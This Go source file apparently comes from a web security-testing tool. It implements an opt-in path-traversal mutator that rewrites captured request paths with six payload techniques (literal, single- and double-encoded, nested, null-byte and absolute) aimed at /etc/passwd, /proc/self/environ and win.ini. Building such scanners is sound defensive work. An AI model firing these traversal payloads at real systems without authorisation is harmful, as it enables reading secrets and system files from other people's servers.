package mutate

import (
	"strings"

	"github.com/bugsyhewitt/possession/internal/model"
)

// PathTraversal is the directory/path-traversal access-control bypass mutator.
// It targets the OWASP A01:2021 "Path Traversal / Local File Inclusion"
// family at the request-path layer: the application maps the trailing path
// segment (or a path-shaped parameter) onto a server-side file or resource
// lookup, and an attacker reshapes that segment with `../` chains to escape
// the intended resource scope and reference a parent directory the caller
// was never authorised to reach. Classic targets are OS-shipped sensitive
// files (`/etc/passwd`, Windows `win.ini`, `/proc/self/environ`); in
// modern API surfaces the same shape escapes a per-user / per-tenant
// resource subtree to reach a sibling tenant's directory or an
// administrative resource the route prefix was supposed to gate.
//
// Where ForbiddenBypass (`traversal-semicolon`) reshapes the path to
// desynchronise a fronting proxy's deny-rule matcher from the upstream
// router (the same path resolves back to the SAME protected handler),
// SwapObject substitutes a known-owner resource ID for another identity's
// known-owner resource ID, and EnumerateID sweeps a numeric range around
// the captured ID, PathTraversal escapes the resource scope ENTIRELY —
// the rewritten path points at a parent-directory location the caller's
// captured request had no reference to. The three mutators are
// deliberately disjoint: SwapObject and EnumerateID test "can the caller
// reach a sibling object inside the same resource collection?";
// PathTraversal tests "can the caller break OUT of the resource
// collection and reach something the route prefix was never supposed to
// expose at all?" — a different vuln class with a different fix (input
// canonicalisation versus per-object authorisation).
//
// Six technique families, each emitted as a separate variant for
// attribution. Generation order is fixed (sorted-by-technique-name) so
// identical inputs yield an identical variant slice (the offline corpus
// and --dry-run cover it):
//
//   - dot-dot-slash: the textbook literal `../` traversal. Replaces the
//     final path segment with N levels of `../` followed by the target
//     file. The classic CVE shape that still works against handlers that
//     concatenate the segment onto a base directory without
//     canonicalisation (`filepath.Join` in Go strips it; many language
//     runtimes do not).
//
//   - dot-dot-encoded: percent-encoded `..%2f` traversal. Bypasses
//     middleware that filters the literal `../` but URL-decodes the path
//     before handing it to the file lookup. The url.URL RawPath
//     mechanism keeps `%2f` un-double-encoded on the wire (the same
//     invariant ForbiddenBypass and CacheDeception rely on).
//
//   - dot-dot-double-encoded: doubly-encoded `..%252f`. Bypasses
//     middleware that URL-decodes ONCE and then filters: the first
//     decode produces `..%2f`, the literal-`../` filter sees no match,
//     a second decode (or a downstream handler that URL-decodes again)
//     produces the real traversal. Common at gateway/handler boundaries
//     that each decode independently.
//
//   - nested-dot-dot: the `....//` / `....\/` "nested" form that defeats
//     filters which strip a single `../` literal occurrence — after the
//     filter removes one `../`, the remaining bytes collapse back into
//     `../`. A long-standing payload from the Apache / Tomcat traversal
//     advisories that still surfaces on hand-written sanitisers.
//
//   - null-byte-suffix: appends `%00` after the target. Bypasses
//     extension-allowlist filters in languages whose underlying syscalls
//     (read(2), open(2)) treat NUL as string terminator while the
//     high-level string comparison sees the suffix and decides the path
//     ends in an allowed extension. Affects older PHP/Perl handlers and
//     a long tail of C-backed services; emitted at low cost because
//     %00 is a one-byte addition.
//
//   - absolute-path: replaces the path with an absolute reference to the
//     target file. Bypasses handlers that strip leading `../` segments
//     but pass the rest through to a `File.open` / `fs.readFile` call
//     that honours absolute paths. The Java `java.io.File` and Node.js
//     `path.resolve` are the canonical victims; ranked separately
//     because the payload shape has no `..` at all.
//
// For each technique, one variant is emitted per traversal target. The
// target set is kept small and high-signal — the files every traversal
// payload list opens with, covering Linux (`etc/passwd`,
// `proc/self/environ`) and Windows (`windows/win.ini`). Cross-product
// is (6 techniques × len(traversalTargets)) variants — bounded and
// deterministic. The variant ID derived by the planner from the
// mutation Detail carries both the technique and the target so the
// offline corpus tests pin every cross-product cell.
//
// Every variant keeps the caller's own credentials (Identity == nil):
// this is emphatically NOT an identity swap. The bug being tested is
// "the same legitimately-credentialed caller breaks out of the
// resource subtree the route prefix was supposed to confine them to."
// Detection rides the existing comparative ladder unchanged: a variant
// that returns a 2xx response whose body shape diverges sharply from
// the caller's own baseline (or which contains content markers from
// the target file the comparative ladder did not see in the owner
// baseline) is the candidate traversal finding. Findings are class
// "authz-bypass" (ASVS V12.3 — file & resource control, severity HIGH)
// — the same class ForbiddenBypass, HostHeader, MethodOverride,
// CSRFHeader, CookieTamper, HeaderInjection, ParamPollution,
// OriginSpoof, ContentTypeConfusion, and CacheDeception use.
//
// Endpoints whose path is empty or root (`/`) are skipped — there is no
// final segment to reshape, and the comparative ladder cannot
// distinguish a root traversal from a root baseline. This mirrors the
// no-op-skip pattern HostHeader, CacheDeception, and ForbiddenBypass
// use for degenerate inputs.
//
// PathTraversal is OFF by default (Enabled == false). The traversal
// payloads are active probes that reach OS-sensitive paths and (on a
// vulnerable target) exfiltrate sensitive file contents, so it only
// fires when the operator explicitly opts in via --path-traversal.
// This mirrors the off-by-default gating of XXE, MassAssign,
// EnumerateID, ForbiddenBypass, WSHijack, CSRFHeader, MethodOverride,
// HostHeader, CookieTamper, HeaderInjection, ParamPollution,
// OriginSpoof, ContentTypeConfusion, CacheDeception, and
// PrototypePollution.
//
// Like every mutator, Generate is pure and deterministic: techniques
// are emitted in sorted-by-name order, targets in sorted order within
// each technique, so identical inputs yield an identical variant
// slice.
type PathTraversal struct {
	Enabled bool
}

func (PathTraversal) Name() string { return "path-traversal" }

// traversalTargets is the canonical, sorted list of high-signal
// traversal target files. Kept small (Linux + Windows + Linux-runtime)
// because variant count is (techniques × targets) and the comparative
// ladder benefits from a focused, attributable payload set rather than
// a brute-forced wordlist. Sorted alphabetically so emission order is
// deterministic without an at-call-site sort; the order test covers
// this. Path components are joined with "/" — Windows targets still
// use forward slashes because the traversal payload is constructed on
// the wire (where both Windows IIS and Node.js servers accept
// forward-slash-separated traversal as well as backslash-separated).
var traversalTargets = []string{
	// Linux passwd database — the universal "you got file read" canary.
	"etc/passwd",
	// Linux per-process environ — frequently exposes secrets injected
	// via the parent shell (DB URLs, API tokens).
	"proc/self/environ",
	// Windows initialisation file — the universal Windows file-read
	// canary, present on every Windows host since NT.
	"windows/win.ini",
}

// traversalDepth is the number of `../` segments injected per payload.
// Six levels reaches the filesystem root from a typical
// `/var/www/app/handler/segment` request path on Linux and
// `C:\Inetpub\wwwroot\app\handler\segment` on Windows — enough headroom
// for the deepest deployment shapes without ballooning the payload.
// Kept as a package constant so the variant ID is stable across runs
// and across builds.
const traversalDepth = 6

// Pre-computed traversal chains — these depend only on the constant
// traversalDepth, so computing them once at package init avoids
// repeated strings.Repeat calls inside the technique×target loop.
var (
	traversalChainSlash     = strings.Repeat("../", traversalDepth)
	traversalChainEncoded   = strings.Repeat("..%2f", traversalDepth)
	traversalChainDoubleEnc = strings.Repeat("..%252f", traversalDepth)
	traversalChainNested    = strings.Repeat("....//", traversalDepth)
)

func (pt PathTraversal) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	if !pt.Enabled || base == nil || base.URL == nil {
		return nil
	}

	origPath := base.URL.Path
	// Skip root / empty paths: there is no final segment to reshape and
	// the comparative ladder cannot classify a root-against-root probe.
	if origPath == "" || origPath == "/" {
		return nil
	}

	// Compute the base directory the traversal rides on: everything up
	// to and including the final "/". For "/api/files/photo.jpg" the
	// base is "/api/files/"; the traversal replaces the trailing
	// segment ("photo.jpg") so the rewritten path is
	// "/api/files/" + "../../..etc/passwd" → "/api/files/../../etc/passwd"
	// which a non-canonicalising file lookup resolves to "/etc/passwd".
	base_ := origPath
	if i := strings.LastIndexByte(origPath, '/'); i >= 0 {
		base_ = origPath[:i+1]
	} else {
		base_ = "/"
	}

	// Both slices are declared in sorted order at package level so no
	// copy or re-sort is needed; iterating them directly keeps generation
	// deterministic without per-call allocation.
	//
	// Technique names, already alphabetically ordered — pinned by the
	// order test.
	techniques := []string{
		"absolute-path",
		"dot-dot-double-encoded",
		"dot-dot-encoded",
		"dot-dot-slash",
		"nested-dot-dot",
		"null-byte-suffix",
	}

	var out []model.Variant
	for _, tech := range techniques {
		for _, tgt := range traversalTargets {
			decoded, escaped, ok := buildTraversalPath(tech, base_, tgt)
			if !ok {
				continue
			}
			// Guard against a transform that happened to produce the same
			// wire path as the original (e.g. a degenerate input). The
			// comparative ladder cannot distinguish a byte-identical
			// variant from the baseline; mirrors the no-op-skip every
			// path-mutating mutator uses.
			if escaped == origPath {
				continue
			}
			req := CloneRequest(base)
			cloneURL(req, base)
			req.URL.Path = decoded
			// RawPath is honoured by url.URL.String() only when it is a
			// valid escaping of Path; the encoded / double-encoded /
			// null-byte techniques rely on this to reach the wire with
			// their percent-encoded payloads un-double-encoded (the
			// same invariant ForbiddenBypass and CacheDeception use).
			req.URL.RawPath = escaped

			out = append(out, model.Variant{
				Base:     req,
				Identity: nil, // credentials unchanged — same permitted caller
				Mutation: model.Mutation{
					Type: "path-traversal",
					Description: "reshape path (" + tech + ":" + tgt +
						") to escape resource scope via directory traversal",
					Detail: map[string]string{
						"path-traversal": tech + ":" + tgt,
						"technique":      tech + ":" + tgt,
						"shape":          tech,
						"target":         tgt,
						"path_from":      origPath,
						"path_to":        escaped,
					},
					Class: "authz-bypass",
				},
			})
		}
	}

	return out
}

// buildTraversalPath returns (decoded, escaped, ok) for a given technique +
// base directory + target file. The decoded form is what url.URL.Path
// holds (the form a non-encoding-aware logger or comparator sees); the
// escaped form is what goes on the wire via url.URL.RawPath. The two are
// identical for techniques that inject no percent-encoding (dot-dot-slash,
// nested-dot-dot, absolute-path); the encoded / double-encoded /
// null-byte techniques set them deliberately so the percent-encoded
// payload survives un-double-encoded to the wire.
//
// The function is pure — no I/O, no time-dependent state — and is
// exported (lowercase, package-private) to the test file so individual
// techniques can be unit-tested without going through Generate.
func buildTraversalPath(technique, baseDir, target string) (decoded, escaped string, ok bool) {
	if baseDir == "" || target == "" {
		return "", "", false
	}
	switch technique {
	case "dot-dot-slash":
		// /api/files/ -> /api/files/../../../../../../etc/passwd
		// Literal `../` chain; the most direct payload.
		p := baseDir + traversalChainSlash + target
		return p, p, true

	case "dot-dot-encoded":
		// /api/files/ -> /api/files/..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
		// Decoded form keeps the real "/" (the file lookup sees the
		// traversal); the escaped form carries the literal %2f so the
		// gateway's literal-`../` filter does not see the match.
		decodedPath := baseDir + traversalChainSlash + target
		escapedPath := baseDir + traversalChainEncoded + target
		return decodedPath, escapedPath, true

	case "dot-dot-double-encoded":
		// /api/files/ -> /api/files/..%252f..%252f...etc/passwd
		// Twice-encoded. A gateway that decodes once sees ..%2f (still
		// not the literal `../` filter target); the downstream handler
		// decodes a second time and the real `../` reaches the file
		// lookup. Decoded form mirrors single-encoded for the
		// comparative ladder (the `%25` is the encoding of `%`, which
		// after one decode becomes `%2f`; url.URL.Path holds the
		// single-decoded view).
		decodedPath := baseDir + traversalChainEncoded + target
		escapedPath := baseDir + traversalChainDoubleEnc + target
		return decodedPath, escapedPath, true

	case "nested-dot-dot":
		// /api/files/ -> /api/files/....//....//....//etc/passwd
		// Each `....//` collapses to `../` after a single-pass filter
		// strips a `../` literal; the same payload defeats hand-written
		// `replace("../", "")` sanitisers.
		p := baseDir + traversalChainNested + target
		return p, p, true

	case "null-byte-suffix":
		// /api/files/ -> /api/files/../../...etc/passwd%00
		// Bypasses extension-allowlist filters in C-backed handlers:
		// the high-level string comparison sees a (post-NUL) suffix and
		// approves; read(2)/open(2) terminate the path at NUL.
		decodedPath := baseDir + traversalChainSlash + target + "\x00"
		escapedPath := baseDir + traversalChainSlash + target + "%00"
		return decodedPath, escapedPath, true

	case "absolute-path":
		// /api/files/ -> /etc/passwd
		// No `..` at all; the payload is the absolute path the
		// downstream `File.open` / `path.resolve` will honour
		// verbatim. The escaped form is identical to the decoded form
		// (no percent-encoding injected).
		p := "/" + target
		return p, p, true
	}
	return "", "", false
}

// pathTraversalTechnique is a small helper used in tests to assert a
// mutation's technique without depending on the Detail map layout from
// outside the package. Kept here so the technique-key contract lives next
// to its producer (the same pattern hostHeaderTechnique,
// originSpoofTechnique, and cacheDeceptionTechnique establish).
func pathTraversalTechnique(m model.Mutation) string {
	if m.Detail == nil {
		return ""
	}
	return strings.TrimSpace(m.Detail["technique"])
}
